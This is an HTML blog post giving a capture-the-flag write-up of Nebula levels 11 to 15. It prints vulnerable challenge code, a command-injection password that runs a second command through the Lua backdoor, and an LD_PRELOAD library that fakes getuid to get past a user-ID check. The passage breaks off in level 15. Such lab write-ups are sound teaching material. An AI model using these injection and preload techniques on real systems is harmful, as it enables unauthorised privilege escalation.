@@ -1,0 +1,1187 @@
+<!doctype html>
+<html class="no-js">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Unlogic</title>
+        <meta name="author">
+        <meta name="description" content="I have a keyboard, a compiler, and a whole load of luck">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="generator" content="Hugo 0.15" />
+          <link href="http://unlogic.co.ukpost/index.xml" rel="alternate" type="application/rss+xml" title="Unlogic" />
+          <link href="http://unlogic.co.ukpost/index.xml" rel="feed" type="application/rss+xml" title="Unlogic" />
+        <link href='//fonts.googleapis.com/css?family=Roboto:400,300,700|Noto+Serif:400,400italic,700,700italic' rel='stylesheet' type='text/css'>
+        <link rel="stylesheet" href="http://unlogic.co.ukcss/styles.css">
+        <link rel="icon" href="http://unlogic.co.ukfavicon.ico">
+        <link rel="apple-touch-icon" href="http://unlogic.co.ukapple-touch-icon.png" />
+        <link rel="stylesheet" href="http://unlogic.co.ukcss/highlightjs/monokai.css">
+        <script src="http://unlogic.co.ukjs/vendor/modernizr-2.8.0.min.js"></script>
+        <style>
+        .site-header h2 .logo {
+        background: url(http://unlogic.co.ukimages/keyboard-feature.jpg) no-repeat 0 0;
+        }
+        @media (min--moz-device-pixel-ratio: 1.3), (-o-min-device-pixel-ratio: 2.6 / 2), (-webkit-min-device-pixel-ratio: 1.3), (min-device-pixel-ratio: 1.3), (min-resolution: 1.3dppx) {
+          .site-header h2 .logo {
+            background-image: url(http://unlogic.co.ukimages/keyboard-feature.jpg);
+        }}
+       .site-header {
+         background: #2a373d url(http://unlogic.co.ukimages/keyboard-feature.jpg) no-repeat center center;
+         z-index: -1;
+         color: #BBB;
+         height: 170px;
+        }
+        </style>
+    </head>
+    <body>
+        
+        <header class="site-header">
+          <div class="transparent-layer">
+              <h2><a style="color: #EEE" href="http://unlogic.co.uk">Unlogic</a></h2>
+          </div>
+        </header>
+
+
+<div class="container clearfix">
+    <main role="main" class="content">
+        <article class="post">
+            <a class="btn" href="http://unlogic.co.uk" title="">&laquo; </a>
+            
+<h1><a href="http://unlogic.co.uk/2014/07/02/cracking-nebula-part2/" title="Cracking Nebula Part 2">Cracking Nebula Part 2</a></h1>
+
+<footer class="post-info"> <span class="post-meta"><time datetime="2014.07.02">2014.07.02</time>
+&middot; 
+    
+    <a href="http://unlogic.co.uktags/ctf">ctf</a>, 
+    
+    <a href="http://unlogic.co.uktags/hacking">hacking</a>, 
+    
+    <a href="http://unlogic.co.uktags/exploits">exploits</a>
+    
+
+</span>
+</footer>
+
+            
+            <div id="toc" class="toc">
+            <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#level-11:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 11</a></li>
+<li><a href="#level-12:eaf9fabfe6e85567a2c1f06adf83e2d8">level 12</a></li>
+<li><a href="#level-13:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 13</a></li>
+<li><a href="#level-14:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 14</a></li>
+<li><a href="#level-15:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 15</a></li>
+<li><a href="#level-16:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 16</a></li>
+<li><a href="#level-17:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 17</a></li>
+<li><a href="#level-18:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 18</a></li>
+<li><a href="#flag-19:eaf9fabfe6e85567a2c1f06adf83e2d8">Flag 19</a></li>
+<li><a href="#closing-words:eaf9fabfe6e85567a2c1f06adf83e2d8">Closing words</a></li>
+</ul></li>
+</ul>
+</nav>
+            </div>
+            
+            
+
+<p>On <a href="http://www.exploit-exercises.com/">Exploit Exercises</a> you can find a
+number of CTF (Capture The Flag) VM images where you can practice your
+exploiting, hacking and general computer savviness. I&rsquo;ve been working
+my way through the Nebula machine and figured I might as well write
+up the process both for other&rsquo;s benefit if they get stuck, and also as
+a sort of diary for myself, so I can refer back to any info if I need to.</p>
+
+<p>This continues on from <a href="http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/">part 1</a>.</p>
+
+<h2 id="level-11:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 11</h2>
+
+<blockquote>
+<p>The /home/flag11/flag11 binary processes standard input and executes a shell command.</p>
+
+<p>There are two ways of completing this level, you may wish to do both :-)</p>
+</blockquote>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
+<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
+<span style="color: #75715e">#include &lt;string.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
+<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
+<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/mman.h&gt;</span>
+
+<span style="color: #75715e">/*</span>
+<span style="color: #75715e"> * Return a random, non predictable file, and return the file descriptor for it.</span>
+<span style="color: #75715e"> */</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">getrand</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">path)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">tmp;</span>
+  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">pid;</span>
+  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd;</span>
+
+  <span style="color: #f8f8f2">srandom(time(NULL));</span>
+
+  <span style="color: #f8f8f2">tmp</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getenv(</span><span style="color: #e6db74">&quot;TEMP&quot;</span><span style="color: #f8f8f2">);</span>
+  <span style="color: #f8f8f2">pid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getpid();</span>
+  
+  <span style="color: #f8f8f2">asprintf(path,</span> <span style="color: #e6db74">&quot;%s/%d.%c%c%c%c%c%c&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">tmp,</span> <span style="color: #f8f8f2">pid,</span> 
+    <span style="color: #e6db74">&#39;A&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">),</span> <span style="color: #e6db74">&#39;0&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">10</span><span style="color: #f8f8f2">),</span> 
+    <span style="color: #e6db74">&#39;a&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">),</span> <span style="color: #e6db74">&#39;A&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">),</span>
+    <span style="color: #e6db74">&#39;0&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">10</span><span style="color: #f8f8f2">),</span> <span style="color: #e6db74">&#39;a&#39;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(random()</span> <span style="color: #f92672">%</span> <span style="color: #ae81ff">26</span><span style="color: #f8f8f2">));</span>
+
+  <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">path,</span> <span style="color: #f8f8f2">O_CREAT</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">O_RDWR,</span> <span style="color: #ae81ff">0600</span><span style="color: #f8f8f2">);</span>
+  <span style="color: #f8f8f2">unlink(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">path);</span>
+  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">fd;</span>
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">process</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">buffer,</span> <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">length)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">unsigned</span> <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">key;</span>
+  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">i;</span>
+
+  <span style="color: #f8f8f2">key</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">length</span> <span style="color: #f92672">&amp;</span> <span style="color: #ae81ff">0xff</span><span style="color: #f8f8f2">;</span>
+
+  <span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">&lt;</span> <span style="color: #f8f8f2">length;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">buffer[i]</span> <span style="color: #f92672">^=</span> <span style="color: #f8f8f2">key;</span>
+    <span style="color: #f8f8f2">key</span> <span style="color: #f92672">-=</span> <span style="color: #f8f8f2">buffer[i];</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #f8f8f2">system(buffer);</span>
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #75715e">#define CL &quot;Content-Length: &quot;</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">line[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">];</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">mem;</span>
+  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">length;</span>
+  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd;</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">path;</span>
+
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fgets(line,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(line),</span> <span style="color: #f8f8f2">stdin)</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">errx(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;reading from stdin&quot;</span><span style="color: #f8f8f2">);</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #f8f8f2">CL,</span> <span style="color: #f8f8f2">strlen(CL))</span> <span style="color: #f92672">!=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">errx(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;invalid header&quot;</span><span style="color: #f8f8f2">);</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #f8f8f2">length</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">atoi(line</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">strlen(CL));</span>
+  
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(length</span> <span style="color: #f92672">&lt;</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf))</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fread(buf,</span> <span style="color: #f8f8f2">length,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">stdin)</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">length)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;fread length&quot;</span><span style="color: #f8f8f2">);</span>
+    <span style="color: #f8f8f2">}</span>
+    <span style="color: #f8f8f2">process(buf,</span> <span style="color: #f8f8f2">length);</span>
+  <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">blue</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">length;</span>
+    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">pink;</span>
+
+    <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getrand(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">path);</span>
+
+    <span style="color: #66d9ef">while</span><span style="color: #f8f8f2">(blue</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;blue = %d, length = %d, &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">blue,</span> <span style="color: #f8f8f2">length);</span>
+
+      <span style="color: #f8f8f2">pink</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fread(buf,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf),</span> <span style="color: #f8f8f2">stdin);</span>
+      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;pink = %d</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">pink);</span>
+
+      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(pink</span> <span style="color: #f92672">&lt;=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+        <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;fread fail(blue = %d, length = %d)&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">blue,</span> <span style="color: #f8f8f2">length);</span>
+      <span style="color: #f8f8f2">}</span>
+      <span style="color: #f8f8f2">write(fd,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #f8f8f2">pink);</span>
+
+      <span style="color: #f8f8f2">blue</span> <span style="color: #f92672">-=</span> <span style="color: #f8f8f2">pink;</span>
+    <span style="color: #f8f8f2">}</span>  
+
+    <span style="color: #f8f8f2">mem</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">mmap(NULL,</span> <span style="color: #f8f8f2">length,</span> <span style="color: #f8f8f2">PROT_READ</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">PROT_WRITE,</span> <span style="color: #f8f8f2">MAP_PRIVATE,</span> <span style="color: #f8f8f2">fd,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(mem</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">MAP_FAILED)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;mmap&quot;</span><span style="color: #f8f8f2">);</span>
+    <span style="color: #f8f8f2">}</span>
+    <span style="color: #f8f8f2">process(mem,</span> <span style="color: #f8f8f2">length);</span>
+  <span style="color: #f8f8f2">}</span>
+
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+
+
+<p>I&rsquo;ll be honest with you and admit that I had a lot of trouble with this. I eventually looked up how to do this on other blogs, but still couldn&rsquo;t get it to work. After some searching I believe it&rsquo;s down to the bash version my VM is running. The exploit was possible due to some feature in older versions of bash, but not in the version I have. If you would like to read how to get level 11 you can do so here: <a href="http://www.kroosec.com/2012/11/nebula-level11.html">http://www.kroosec.com/2012/11/nebula-level11.html</a></p>
+
+<h2 id="level-12:eaf9fabfe6e85567a2c1f06adf83e2d8">level 12</h2>
+
+<blockquote>
+<p>There is a backdoor process listening on port 50001.</p>
+</blockquote>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">local</span> <span style="color: #f8f8f2">socket</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">require(</span><span style="color: #e6db74">&quot;socket&quot;</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">local</span> <span style="color: #f8f8f2">server</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">assert(socket.bind(</span><span style="color: #e6db74">&quot;127.0.0.1&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">50001</span><span style="color: #f8f8f2">))</span>
+
+<span style="color: #f8f8f2">function</span> <span style="color: #f8f8f2">hash(password)</span> 
+  <span style="color: #f8f8f2">prog</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">io.popen(</span><span style="color: #e6db74">&quot;echo &quot;</span><span style="color: #f8f8f2">..password..</span><span style="color: #e6db74">&quot; | sha1sum&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;r&quot;</span><span style="color: #f8f8f2">)</span>
+  <span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">prog:read(</span><span style="color: #e6db74">&quot;*all&quot;</span><span style="color: #f8f8f2">)</span>
+  <span style="color: #f8f8f2">prog:close()</span>
+
+  <span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">string.sub(data,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">40</span><span style="color: #f8f8f2">)</span>
+
+  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">data</span>
+<span style="color: #f8f8f2">end</span>
+
+
+<span style="color: #66d9ef">while</span> <span style="color: #ae81ff">1</span> <span style="color: #66d9ef">do</span>
+  <span style="color: #f8f8f2">local</span> <span style="color: #f8f8f2">client</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">server:accept()</span>
+  <span style="color: #f8f8f2">client:send(</span><span style="color: #e6db74">&quot;Password: &quot;</span><span style="color: #f8f8f2">)</span>
+  <span style="color: #f8f8f2">client:settimeout(</span><span style="color: #ae81ff">60</span><span style="color: #f8f8f2">)</span>
+  <span style="color: #f8f8f2">local</span> <span style="color: #f8f8f2">line,</span> <span style="color: #f8f8f2">err</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">client:receive()</span>
+  <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">not</span> <span style="color: #f8f8f2">err</span> <span style="color: #f8f8f2">then</span>
+    <span style="color: #f8f8f2">print(</span><span style="color: #e6db74">&quot;trying &quot;</span> <span style="color: #f8f8f2">..</span> <span style="color: #f8f8f2">line)</span> <span style="color: #f92672">--</span> <span style="color: #f8f8f2">log</span> <span style="color: #f8f8f2">from</span> <span style="color: #f8f8f2">where</span> <span style="color: #f8f8f2">;</span>\
+    <span style="color: #f8f8f2">local</span> <span style="color: #f8f8f2">h</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">hash(line)</span>
+
+    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">h</span> <span style="color: #f92672">~=</span> <span style="color: #e6db74">&quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot;</span> <span style="color: #f8f8f2">then</span>
+      <span style="color: #f8f8f2">client:send(</span><span style="color: #e6db74">&quot;Better luck next time</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
+    <span style="color: #66d9ef">else</span>
+      <span style="color: #f8f8f2">client:send(</span><span style="color: #e6db74">&quot;Congrats, your token is 413**CARRIER LOST**</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">)</span>
+    <span style="color: #f8f8f2">end</span>
+
+  <span style="color: #f8f8f2">end</span>
+
+  <span style="color: #f8f8f2">client:close()</span>
+<span style="color: #f8f8f2">end</span>
+</pre></div>
+
+
+<p>So we need to connect to the localhost on port 50001 and enter the correct password. the password is whatever the hash is in plain text. But even if we get it right you can see that we don&rsquo;t get our token. With a specially crafted password however, we can make use of the <code>io.popen</code> call.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level12@nebula:/home/flag12$ nc localhost 50001
+Password: hello &amp;&amp; getflag &gt; /tmp/out
+Better luck next time
+level12@nebula:/home/flag12$ cat /tmp/out
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<h2 id="level-13:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 13</h2>
+
+<blockquote>
+<p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>
+</blockquote>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
+<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
+<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
+<span style="color: #75715e">#include &lt;string.h&gt;</span>
+
+<span style="color: #75715e">#define FAKEUID 1000</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">c;</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">token[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>
+
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(getuid()</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">FAKEUID)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Security failure detected. UID %d started us, we expect %d</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">getuid(),</span> <span style="color: #f8f8f2">FAKEUID);</span>
+    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;The system administrators will be notified of this violation</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
+    <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #75715e">// snip, sorry :)</span>
+
+  <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;your token is %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">token);</span>
+  
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+</p>
+
+<p>Here we need to fake our UID. Sounds tricky. Actually, we don&rsquo;t fake our UID, we fake the call to <code>getuid</code>. How?
+<code>getuid</code> is called from a library, which means we are able to replace it with our own library. Let&rsquo;s take a look at
+the function definition of <code>getuid</code></p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">GETUID(2)                  Linux Programmer&#39;s Manual                 GETUID(2)
+
+NAME
+       getuid, geteuid - get user identity
+
+SYNOPSIS
+       #include &lt;unistd.h&gt;
+       #include &lt;sys/types.h&gt;
+
+       uid_t getuid(void);
+       uid_t geteuid(void);
+</pre></div>
+</p>
+
+<p>Ok, so let&rsquo;s write our verison of:</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
+
+<span style="color: #66d9ef">uid_t</span> <span style="color: #a6e22e">getuid</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span> <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">1000</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">}</span>
+</pre></div>
+</p>
+
+<p>and compile it as a shared library which we then preload (see <code>man ld.so</code> for more info on this). We need to
+copy the <code>flag13</code> binary to our local directory because it needs to be run as the same user level as the
+library we are trying to preload.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level13@nebula:/tmp$ gcc -shared -fPIC fake.c -o fetgetuid.so
+level13@nebula:/tmp$ cp ~flag13/flag13 .
+level13@nebula:/tmp$ <span style="color: #f8f8f2">export LD_PRELOAD</span><span style="color: #f92672">=</span>/tmp/fetgetuid.so
+level13@nebula:/tmp$ ./flag13
+your token is b705702b-76a8-42b0-8844-3adabbe5ac58
+level13@nebula:/tmp$ ssh flag13@localhost
+flag13@localhost&#39;s password: b705702b-76a8-42b0-8844-3adabbe5ac58
+flag13@nebula:~$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<h2 id="level-14:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 14</h2>
+
+<blockquote>
+<p>This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</p>
+</blockquote>
+
+<p>The contents of <code>token</code> were encrypted using the <code>flag14</code> binary in <code>~flag14</code>. If you run it you can see how it works. Let&rsquo;s enter something and see if we can work out how it works. I created a file with the contents <code>abcdefghijklmno</code> in <code>/tmp/test</code></p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"> level14@nebula:/home/flag14$ cat /tmp/test | ./flag14 -e
+acegikmoqsuwy{}level14@nebula:/home/flag14$
+</pre></div>
+</p>
+
+<p>So luckily it&rsquo;s fairly straightforward, it offsets each letter by the value of its position in the string. A quick Python script can reverse the process.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">decrypt</span><span style="color: #f8f8f2">(input):</span>
+  <span style="color: #f8f8f2">out</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span>
+  <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i,</span> <span style="color: #f8f8f2">c</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">enumerate(input):</span>
+    <span style="color: #f8f8f2">dec</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">ord(c)</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">i</span>
+    <span style="color: #f8f8f2">out</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">chr(dec)</span>
+
+  <span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">out</span>
+
+
+<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">__name__</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;__main__&#39;</span><span style="color: #f8f8f2">:</span>
+  <span style="color: #f8f8f2">input</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
+  <span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">input</span>
+  <span style="color: #f8f8f2">decrypt(input)</span>
+</pre></div>
+</p>
+
+<p>And now pipe the token into it</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level14@nebula:/home/flag14$ python /tmp/decrypt.py 857:g67?5ABBo:BtDA?tIvLDKL<span style="color: #f92672">{</span>MQPSRQWW.
+857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
+8457c118-887c-4e40-a5a6-33a25353165
+
+level14@nebula:/home/flag14$ ssh flag14@localhost
+
+flag14@localhost&#39;s password: 8457c118-887c-4e40-a5a6-33a25353165
+
+flag14@nebula:~$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<h2 id="level-15:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 15</h2>
+
+<blockquote>
+<p>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.</p>
+
+<p>You may wish to review how to &ldquo;compile a shared library in linux&rdquo; and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.</p>
+
+<p>Clean up after yourself :)</p>
+</blockquote>
+
+<p>After running <code>strace</code> we notice this particular bit</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/home/flag15$ strace ./flag15
+.
+.
+open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfdb8ba4) = -1 ENOENT (No such file or directory)
